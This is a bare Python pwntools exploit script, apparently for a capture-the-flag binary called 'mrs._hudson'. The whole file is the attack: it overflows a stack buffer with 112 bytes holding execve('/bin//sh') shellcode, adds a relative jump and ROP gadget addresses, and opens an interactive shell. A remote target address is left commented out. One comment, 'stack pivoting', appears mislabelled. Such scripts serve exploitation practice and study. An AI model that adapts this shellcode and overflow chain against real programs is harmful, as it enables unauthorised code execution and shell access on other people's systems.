from pwn import *

r = process("./mrs._hudson")
#r = remote("146.185.168.172", 8642)
r.recvuntil("2000.")

pop_rdi = p64(0x4006f3) # stack pivoting
call_rsp = p64(0x4006da)

rop = pop_rdi + call_rsp
aux_shellcode = "\xeb" + "\x8e"*7 # relative jump to shellcode

payload = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05".ljust(112, "A") + aux_shellcode + rop
r.sendline(payload)
r.interactive()

